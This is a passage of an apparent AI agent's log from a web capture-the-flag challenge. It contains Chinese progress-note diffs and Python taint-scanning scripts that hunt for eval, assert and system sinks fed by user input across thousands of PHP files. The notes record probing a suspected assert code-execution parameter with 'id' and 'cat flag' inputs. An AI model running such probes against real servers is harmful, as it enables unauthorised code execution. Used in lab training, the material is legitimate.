++- 同参数全文件追踪显示：所有直接 `system/exec/eval($_GET/POST[...])` 在此前都出现过对同名输入槽的赋值，说明真正异常更可能是“用户输入→局部变量→sink”链或赋值处位于不可达分支
+ 
+ ## Flags Found
+ (无)
+
+exec
+/bin/bash -lc "python3 - <<'PY'
+from pathlib import Path
+import re
+root=Path('/tmp/ctf-src.9vgiAJ/src')
+# remove PHP comments while preserving newlines/strings approximately
+def strip_comments(s):
+ out=[]; i=0; state='code'; q='';
+ while i<len(s):
+  c=s[i]; n=s[i+1] if i+1<len(s) else ''
+  if state=='code':
+   if c in \"'\\\"\": state='str'; q=c; out.append(c)
+   elif c=='/' and n=='*': state='block'; out.extend('  '); i+=1
+   elif c=='/' and n=='/': state='line'; out.extend('  '); i+=1
+   elif c=='#': state='line'; out.append(' ')
+   else: out.append(c)
+  elif state=='str':
+   out.append(c)
+   if c=='\\\\' and i+1<len(s): out.append(s[i+1]); i+=1
+   elif c==q: state='code'
+  elif state=='block':
+   if c=='*' and n=='/': out.extend('  '); i+=1; state='code'
+   else: out.append('\\n' if c=='\\n' else ' ')
+  elif state=='line':
+   if c=='\\n': out.append('\\n'); state='code'
+   else: out.append(' ')
+  i+=1
+ return ''.join(out)
+assign_var=re.compile(r'"'^'"\\s*(\\"'$[A-Za-z_][A-Za-z0-9_]*)'"\\s*=\\s*(.*?);\\s*"'$'"')
+assign_sg=re.compile(r'"'^'"\\s*\\"'$_(GET|POST|REQUEST|COOKIE)'"\\s*\\[\\s*[\\'\\\"](["'^'"\\'\\\"]+)[\\'\\\"]\\s*\\]\\s*=')
+source=re.compile(r'\\"'$_(GET|POST|REQUEST|COOKIE|FILES)'"\\s*\\[')
+sink_var=re.compile(r'\\b(eval|assert|system|exec|shell_exec|passthru|popen|proc_open|unserialize|include|include_once|require|require_once)\\s*\\(?\\s*(\\"'$[A-Za-z_][A-Za-z0-9_]*)'"',re.I)
+sink_sg=re.compile(r'\\b(eval|assert|system|exec|shell_exec|passthru|popen|proc_open|unserialize|include|include_once|require|require_once)\\s*\\(?\\s*\\"'$_(GET|POST|REQUEST|COOKIE)'"\\s*\\[\\s*[\\'\\\"](["'^'"\\'\\\"]+)[\\'\\\"]',re.I)
+ifeq=re.compile(r\""'^'"\\s*if\\s*\\(\\s*(['\\\"])(.*?)\\1\\s*(===|==|"'!==|!=)'"\\s*(['\\\"])(.*?)\\4\\s*\\)\\s*\\{?\\s*"'$")
+cands=[]
+for p in root.glob('"'*.php'):
+ code=strip_comments(p.read_text(errors='replace'))
+ taint={}; sg={} ; prev=''
+ for no,line in enumerate(code.splitlines(),1):
+  s=line.strip()
+  # determine if immediately guarded by constant-false single-line if
+  guarded_false=False
+  fm=ifeq.match(prev)
+  if fm:
+   a,op,b=fm.group(2),fm.group(3),fm.group(5); truth=(a==b) if op in ('==','===') else (a"'!=b)
+   guarded_false=not truth
+  # sinks evaluated before applying assignments on same line (generated separate)
+  if not guarded_false:
+   for m in sink_var.finditer(line):
+    if taint.get(m.group(2),False): cands.append((p.name,no,m.group(1),m.group(2),'"'TAINT_VAR',s))
+   for m in sink_sg.finditer(line):
+    if sg.get((m.group(2),m.group(3)),True): cands.append((p.name,no,m.group(1),m.group(2)+'['+m.group(3)+']','LIVE_SG',s))
+  am=assign_sg.match(line)
+  if am: sg[(am.group(1),am.group(2))]=False
+  vm=assign_var.match(line)
+  if vm:
+   rhs=vm.group(2)
+   # tainted if direct source or any currently tainted variable referenced
+   ist=bool(source.search(rhs)) or any(t and re.search(re.escape(v)+r'\\b',rhs) for v,t in taint.items())
+   taint[vm.group(1)]=ist
+  if s: prev=s
+print('candidates',len(cands),'files',len(set(x[0] for x in cands)))
+for x in cands[:500]: print('\\t'.join(map(str,x)))
+PY" in /home/stw/ctf-agent/challenges/manual_web_49388fea2961
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..371e0d07c8e3699b8d9a465e9040fd094e65cf89
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -5,12 +5,12 @@
+ - Start Time: 2026-07-31T13:15:56+08:00
+ 
+ ## Current Phase
+-recon / source acquisition
++vulnerability validation
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 验证 `ASrs5FZnWZi.php?BfgA7IHwU=...` 的字符串 assert 代码执行
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+-3. 汇总候选并进行 HTTP 验证
++3. 若 assert 不可用，检查该文件所有无恒假条件保护的危险调用
+ 
+ ## Key Artifacts
+ - `/tmp/ctf_home.txt`: 首页完整响应；OpenResty + PHP/7.3.5
+@@ -21,6 +21,22 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- 本机未安装 PHP CLI；`/tmp/php_invalid.txt` 结果无效（全部仅因 `php: command not found`）
++- 抽样请求 8 个随机 PHP 均为 200，响应约 0.8–3KB 随机调试输出，说明文件在线且可执行
++- 全量 HTTP 响应采集正在 session 13795 中运行（24 并发，逐文件 12s 超时）
++- 全量采集完成：3000 个 HTTP 200，1 个超时；响应目录 `/tmp/ctf-resp.qoWGAe`，元数据 `/tmp/ctf_http_meta.txt`
++- 唯一超时文件 `ASrs5FZnWZi.php`；27 个响应含随机 flag/ctf 子串，待精查
++- 响应内 flag/ctf 命中均为随机字符串，未见 FLAG 格式
++- `ASrs5FZnWZi.php` 源码含顶层 `$_GET['BfgA7IHwU']=' '; ... assert($_GET['BfgA7IHwU'] ?? ' ');`，但先主动覆盖输入为空格，疑似诱饵/干扰；需检查其它危险调用
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
++- branch_001 初扫结果：危险命令 sink 32,290 行、include/反序列化类 9,395 行、用户输入 264,901 行；高密度随机诱饵明显，下一步按每文件 sink 数、首行可达性和 PHP 7.3 兼容性排序
++- 已确认典型诱饵形态：危险调用前置恒假常量比较（如 `'Q6kMBHJG2' == 'RD1EgknVG'`）；后续筛选将重点找恒真/无 guard 且不在注释中的 sink
++- 可达性初筛未发现恒真常量 guard，但发现大量无简单 guard 命中；其中不少在 sink 前把同名 `$_GET` 覆写为空，需继续做同参数定义追踪并优先验证靠前、未覆写的命令 sink
++- 同参数全文件追踪显示：所有直接 `system/exec/eval($_GET/POST[...])` 在此前都出现过对同名输入槽的赋值，说明真正异常更可能是“用户输入→局部变量→sink”链或赋值处位于不可达分支
+ 
+ ## Flags Found
+ (无)
+
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..371e0d07c8e3699b8d9a465e9040fd094e65cf89
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -5,12 +5,12 @@
+ - Start Time: 2026-07-31T13:15:56+08:00
+ 
+ ## Current Phase
+-recon / source acquisition
++vulnerability validation
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 验证 `ASrs5FZnWZi.php?BfgA7IHwU=...` 的字符串 assert 代码执行
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+-3. 汇总候选并进行 HTTP 验证
++3. 若 assert 不可用，检查该文件所有无恒假条件保护的危险调用
+ 
+ ## Key Artifacts
+ - `/tmp/ctf_home.txt`: 首页完整响应；OpenResty + PHP/7.3.5
+@@ -21,6 +21,22 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- 本机未安装 PHP CLI；`/tmp/php_invalid.txt` 结果无效（全部仅因 `php: command not found`）
++- 抽样请求 8 个随机 PHP 均为 200，响应约 0.8–3KB 随机调试输出，说明文件在线且可执行
++- 全量 HTTP 响应采集正在 session 13795 中运行（24 并发，逐文件 12s 超时）
++- 全量采集完成：3000 个 HTTP 200，1 个超时；响应目录 `/tmp/ctf-resp.qoWGAe`，元数据 `/tmp/ctf_http_meta.txt`
++- 唯一超时文件 `ASrs5FZnWZi.php`；27 个响应含随机 flag/ctf 子串，待精查
++- 响应内 flag/ctf 命中均为随机字符串，未见 FLAG 格式
++- `ASrs5FZnWZi.php` 源码含顶层 `$_GET['BfgA7IHwU']=' '; ... assert($_GET['BfgA7IHwU'] ?? ' ');`，但先主动覆盖输入为空格，疑似诱饵/干扰；需检查其它危险调用
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
++- branch_001 初扫结果：危险命令 sink 32,290 行、include/反序列化类 9,395 行、用户输入 264,901 行；高密度随机诱饵明显，下一步按每文件 sink 数、首行可达性和 PHP 7.3 兼容性排序
++- 已确认典型诱饵形态：危险调用前置恒假常量比较（如 `'Q6kMBHJG2' == 'RD1EgknVG'`）；后续筛选将重点找恒真/无 guard 且不在注释中的 sink
++- 可达性初筛未发现恒真常量 guard，但发现大量无简单 guard 命中；其中不少在 sink 前把同名 `$_GET` 覆写为空，需继续做同参数定义追踪并优先验证靠前、未覆写的命令 sink
++- 同参数全文件追踪显示：所有直接 `system/exec/eval($_GET/POST[...])` 在此前都出现过对同名输入槽的赋值，说明真正异常更可能是“用户输入→局部变量→sink”链或赋值处位于不可达分支
+ 
+ ## Flags Found
+ (无)
+
+hook: PostToolUse
+hook: PostToolUse Completed
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..371e0d07c8e3699b8d9a465e9040fd094e65cf89
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -5,12 +5,12 @@
+ - Start Time: 2026-07-31T13:15:56+08:00
+ 
+ ## Current Phase
+-recon / source acquisition
++vulnerability validation
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 验证 `ASrs5FZnWZi.php?BfgA7IHwU=...` 的字符串 assert 代码执行
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+-3. 汇总候选并进行 HTTP 验证
++3. 若 assert 不可用，检查该文件所有无恒假条件保护的危险调用
+ 
+ ## Key Artifacts
+ - `/tmp/ctf_home.txt`: 首页完整响应；OpenResty + PHP/7.3.5
+@@ -21,6 +21,22 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- 本机未安装 PHP CLI；`/tmp/php_invalid.txt` 结果无效（全部仅因 `php: command not found`）
++- 抽样请求 8 个随机 PHP 均为 200，响应约 0.8–3KB 随机调试输出，说明文件在线且可执行
++- 全量 HTTP 响应采集正在 session 13795 中运行（24 并发，逐文件 12s 超时）
++- 全量采集完成：3000 个 HTTP 200，1 个超时；响应目录 `/tmp/ctf-resp.qoWGAe`，元数据 `/tmp/ctf_http_meta.txt`
++- 唯一超时文件 `ASrs5FZnWZi.php`；27 个响应含随机 flag/ctf 子串，待精查
++- 响应内 flag/ctf 命中均为随机字符串，未见 FLAG 格式
++- `ASrs5FZnWZi.php` 源码含顶层 `$_GET['BfgA7IHwU']=' '; ... assert($_GET['BfgA7IHwU'] ?? ' ');`，但先主动覆盖输入为空格，疑似诱饵/干扰；需检查其它危险调用
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
++- branch_001 初扫结果：危险命令 sink 32,290 行、include/反序列化类 9,395 行、用户输入 264,901 行；高密度随机诱饵明显，下一步按每文件 sink 数、首行可达性和 PHP 7.3 兼容性排序
++- 已确认典型诱饵形态：危险调用前置恒假常量比较（如 `'Q6kMBHJG2' == 'RD1EgknVG'`）；后续筛选将重点找恒真/无 guard 且不在注释中的 sink
++- 可达性初筛未发现恒真常量 guard，但发现大量无简单 guard 命中；其中不少在 sink 前把同名 `$_GET` 覆写为空，需继续做同参数定义追踪并优先验证靠前、未覆写的命令 sink
++- 同参数全文件追踪显示：所有直接 `system/exec/eval($_GET/POST[...])` 在此前都出现过对同名输入槽的赋值，说明真正异常更可能是“用户输入→局部变量→sink”链或赋值处位于不可达分支
+ 
+ ## Flags Found
+ (无)
+
+ exited 130 in 69819ms:
+Traceback (most recent call last):
+  File "<stdin>", line 57, in <module>
+  File "<stdin>", line 57, in <genexpr>
+  File "/home/stw/miniconda3/lib/python3.13/re/__init__.py", line 177, in search
+    return _compile(pattern, flags).search(string)
+           ~~~~~~~~^^^^^^^^^^^^^^^^
+  File "/home/stw/miniconda3/lib/python3.13/re/__init__.py", line 350, in _compile
+    p = _compiler.compile(pattern, flags)
+  File "/home/stw/miniconda3/lib/python3.13/re/_compiler.py", line 748, in compile
+    p = _parser.parse(p, flags)
+  File "/home/stw/miniconda3/lib/python3.13/re/_parser.py", line 980, in parse
+    p = _parse_sub(source, state, flags & SRE_FLAG_VERBOSE, 0)
+  File "/home/stw/miniconda3/lib/python3.13/re/_parser.py", line 459, in _parse_sub
+    itemsappend(_parse(source, state, verbose, nested + 1,
+                ~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                       not nested and not items))
+                       ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/stw/miniconda3/lib/python3.13/re/_parser.py", line 543, in _parse
+    code = _escape(source, this, state)
+  File "/home/stw/miniconda3/lib/python3.13/re/_parser.py", line 443, in _escape
+    return LITERAL, ord(escape[1])
+                    ~~~^^^^^^^^^^^
+KeyboardInterrupt
+
+apply patch
+patch: completed
+/home/stw/ctf-agent/challenges/manual_web_49388fea2961/progress.md
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..b6010763641aba732fb3c01ef8e2a88af9cd862d
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -5,12 +5,12 @@
+ - Start Time: 2026-07-31T13:15:56+08:00
+ 
+ ## Current Phase
+-recon / source acquisition
++source triage
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 静态提取 sink 参数，筛掉同键覆写、注释、恒假 guard 与不可达函数
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+-3. 汇总候选并进行 HTTP 验证
++3. 对剩余候选批量发送兼容 shell/PHP 的 `echo MARK;` 验证
+ 
+ ## Key Artifacts
+ - `/tmp/ctf_home.txt`: 首页完整响应；OpenResty + PHP/7.3.5
+@@ -21,6 +21,26 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- 本机未安装 PHP CLI；`/tmp/php_invalid.txt` 结果无效（全部仅因 `php: command not found`）
++- 抽样请求 8 个随机 PHP 均为 200，响应约 0.8–3KB 随机调试输出，说明文件在线且可执行
++- 全量 HTTP 响应采集正在 session 13795 中运行（24 并发，逐文件 12s 超时）
++- 全量采集完成：3000 个 HTTP 200，1 个超时；响应目录 `/tmp/ctf-resp.qoWGAe`，元数据 `/tmp/ctf_http_meta.txt`
++- 唯一超时文件 `ASrs5FZnWZi.php`；27 个响应含随机 flag/ctf 子串，待精查
++- 响应内 flag/ctf 命中均为随机字符串，未见 FLAG 格式
++- `ASrs5FZnWZi.php` 源码含顶层 `$_GET['BfgA7IHwU']=' '; ... assert($_GET['BfgA7IHwU'] ?? ' ');`，但先主动覆盖输入为空格，疑似诱饵/干扰；需检查其它危险调用
++- 验证 ASrs 的 `ol_4MNx_Q` 也在执行前被覆写为空格；phpinfo/system/id/cat flag 均无执行，只有 assert 空格失败警告
++- ASrs 首次超时为瞬态网络/服务抖动，后续约 0.3s 正常返回 2092 bytes，不再视为真实入口
++- 全语料函数调用几乎仅由生成器固定词汇组成：var_dump/stdClass/explode/print_r/preg_match/function_exists/str_replace/preg_replace/eval/assert/exec/system；无 base64/file/include 等独特后门词
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
++- branch_001 初扫结果：危险命令 sink 32,290 行、include/反序列化类 9,395 行、用户输入 264,901 行；高密度随机诱饵明显，下一步按每文件 sink 数、首行可达性和 PHP 7.3 兼容性排序
++- 已确认典型诱饵形态：危险调用前置恒假常量比较（如 `'Q6kMBHJG2' == 'RD1EgknVG'`）；后续筛选将重点找恒真/无 guard 且不在注释中的 sink
++- 可达性初筛未发现恒真常量 guard，但发现大量无简单 guard 命中；其中不少在 sink 前把同名 `$_GET` 覆写为空，需继续做同参数定义追踪并优先验证靠前、未覆写的命令 sink
++- 同参数全文件追踪显示：所有直接 `system/exec/eval($_GET/POST[...])` 在此前都出现过对同名输入槽的赋值，说明真正异常更可能是“用户输入→局部变量→sink”链或赋值处位于不可达分支
++- 首版局部变量污点脚本因逐变量正则复杂度过高已中止，未产生结论；改为只维护变量布尔污点并通过一次 RHS 变量提取传播
+ 
+ ## Flags Found
+ (无)
+
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..b6010763641aba732fb3c01ef8e2a88af9cd862d
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -5,12 +5,12 @@
+ - Start Time: 2026-07-31T13:15:56+08:00
+ 
+ ## Current Phase
+-recon / source acquisition
++source triage
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 静态提取 sink 参数，筛掉同键覆写、注释、恒假 guard 与不可达函数
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+-3. 汇总候选并进行 HTTP 验证
++3. 对剩余候选批量发送兼容 shell/PHP 的 `echo MARK;` 验证
+ 
+ ## Key Artifacts
+ - `/tmp/ctf_home.txt`: 首页完整响应；OpenResty + PHP/7.3.5
+@@ -21,6 +21,26 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- 本机未安装 PHP CLI；`/tmp/php_invalid.txt` 结果无效（全部仅因 `php: command not found`）
++- 抽样请求 8 个随机 PHP 均为 200，响应约 0.8–3KB 随机调试输出，说明文件在线且可执行
++- 全量 HTTP 响应采集正在 session 13795 中运行（24 并发，逐文件 12s 超时）
++- 全量采集完成：3000 个 HTTP 200，1 个超时；响应目录 `/tmp/ctf-resp.qoWGAe`，元数据 `/tmp/ctf_http_meta.txt`
++- 唯一超时文件 `ASrs5FZnWZi.php`；27 个响应含随机 flag/ctf 子串，待精查
++- 响应内 flag/ctf 命中均为随机字符串，未见 FLAG 格式
++- `ASrs5FZnWZi.php` 源码含顶层 `$_GET['BfgA7IHwU']=' '; ... assert($_GET['BfgA7IHwU'] ?? ' ');`，但先主动覆盖输入为空格，疑似诱饵/干扰；需检查其它危险调用
++- 验证 ASrs 的 `ol_4MNx_Q` 也在执行前被覆写为空格；phpinfo/system/id/cat flag 均无执行，只有 assert 空格失败警告
++- ASrs 首次超时为瞬态网络/服务抖动，后续约 0.3s 正常返回 2092 bytes，不再视为真实入口
++- 全语料函数调用几乎仅由生成器固定词汇组成：var_dump/stdClass/explode/print_r/preg_match/function_exists/str_replace/preg_replace/eval/assert/exec/system；无 base64/file/include 等独特后门词
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
++- branch_001 初扫结果：危险命令 sink 32,290 行、include/反序列化类 9,395 行、用户输入 264,901 行；高密度随机诱饵明显，下一步按每文件 sink 数、首行可达性和 PHP 7.3 兼容性排序
++- 已确认典型诱饵形态：危险调用前置恒假常量比较（如 `'Q6kMBHJG2' == 'RD1EgknVG'`）；后续筛选将重点找恒真/无 guard 且不在注释中的 sink
++- 可达性初筛未发现恒真常量 guard，但发现大量无简单 guard 命中；其中不少在 sink 前把同名 `$_GET` 覆写为空，需继续做同参数定义追踪并优先验证靠前、未覆写的命令 sink
++- 同参数全文件追踪显示：所有直接 `system/exec/eval($_GET/POST[...])` 在此前都出现过对同名输入槽的赋值，说明真正异常更可能是“用户输入→局部变量→sink”链或赋值处位于不可达分支
++- 首版局部变量污点脚本因逐变量正则复杂度过高已中止，未产生结论；改为只维护变量布尔污点并通过一次 RHS 变量提取传播
+ 
+ ## Flags Found
+ (无)
+
+exec
+/bin/bash -lc "python3 - <<'PY'
+from pathlib import Path
+import re
+root=Path('/tmp/ctf-src.9vgiAJ/src')
+def strip_comments(s):
+ out=[]; i=0; state='code'; q=''
+ while i<len(s):
+  c=s[i]; n=s[i+1] if i+1<len(s) else ''
+  if state=='code':
+   if c in \"'\\\"\": state='str'; q=c; out.append(c)
+   elif c=='/' and n=='*': state='block'; out.extend('  '); i+=1
+   elif c=='/' and n=='/': state='line'; out.extend('  '); i+=1
+   elif c=='#': state='line'; out.append(' ')
+   else: out.append(c)
+  elif state=='str':
+   out.append(c)
+   if c=='\\\\' and i+1<len(s): out.append(s[i+1]); i+=1
+   elif c==q: state='code'
+  elif state=='block':
+   if c=='*' and n=='/': out.extend('  '); i+=1; state='code'
+   else: out.append('\\n' if c=='\\n' else ' ')
+  else:
+   if c=='\\n': out.append('\\n'); state='code'
+   else: out.append(' ')
+  i+=1
+ return ''.join(out)
+assign_var=re.compile(r'"'^'"\\s*(\\"'$[A-Za-z_][A-Za-z0-9_]*)'"\\s*=\\s*(.*?);\\s*"'$'"')
+assign_sg=re.compile(r'"'^'"\\s*\\"'$_(GET|POST|REQUEST|COOKIE)'"\\s*\\[\\s*[\\'\\\"](["'^'"\\'\\\"]+)[\\'\\\"]\\s*\\]\\s*=')
+source=re.compile(r'\\"'$_(GET|POST|REQUEST|COOKIE|FILES)'"\\s*\\[')
+varref=re.compile(r'\\"'$[A-Za-z_][A-Za-z0-9_]*'"')
+sink_var=re.compile(r'\\b(eval|assert|system|exec|shell_exec|passthru|popen|proc_open|unserialize|include|include_once|require|require_once)\\s*\\(?\\s*(\\"'$[A-Za-z_][A-Za-z0-9_]*)'"',re.I)
+sink_sg=re.compile(r'\\b(eval|assert|system|exec|shell_exec|passthru|popen|proc_open|unserialize|include|include_once|require|require_once)\\s*\\(?\\s*\\"'$_(GET|POST|REQUEST|COOKIE)'"\\s*\\[\\s*[\\'\\\"](["'^'"\\'\\\"]+)[\\'\\\"]',re.I)
+ifeq=re.compile(r\""'^'"\\s*if\\s*\\(\\s*(['\\\"])(.*?)\\1\\s*(===|==|"'!==|!=)'"\\s*(['\\\"])(.*?)\\4\\s*\\)\\s*\\{?\\s*"'$")
+cands=[]
+for p in root.glob('"'*.php'):
+ code=strip_comments(p.read_text(errors='replace'))
+ taint={}; origin={}; sg={}; prev=''
+ for no,line in enumerate(code.splitlines(),1):
+  s=line.strip(); guarded_false=False
+  fm=ifeq.match(prev)
+  if fm:
+   a,op,b=fm.group(2),fm.group(3),fm.group(5); truth=(a==b) if op in ('==','===') else (a"'!=b); guarded_false=not truth
+  if not guarded_false:
+   for m in sink_var.finditer(line):
+    v=m.group(2)
+    if taint.get(v,False): cands.append((p.name,no,m.group(1),v,'"'from '+origin.get(v,'?'),s))
+   for m in sink_sg.finditer(line):
+    key=(m.group(2),m.group(3))
+    if sg.get(key,True): cands.append((p.name,no,m.group(1),key[0]+'['+key[1]+']','LIVE_SG',s))
+   am=assign_sg.match(line)
+   if am: sg[(am.group(1),am.group(2))]=False
+   vm=assign_var.match(line)
+   if vm:
+    lhs,rhs=vm.group(1),vm.group(2)
+    refs=varref.findall(rhs)
+    direct=bool(source.search(rhs)); inherited=next((v for v in refs if taint.get(v,False)),None)
+    taint[lhs]=direct or inherited is not None
+    origin[lhs]=(f'line {no} direct: {s}' if direct else origin.get(inherited,'?') if inherited else '')
+  if s: prev=s
+print('candidates',len(cands),'files',len(set(x[0] for x in cands)))
+for x in cands: print('\\t'.join(map(str,x)))
+PY" in /home/stw/ctf-agent/challenges/manual_web_49388fea2961
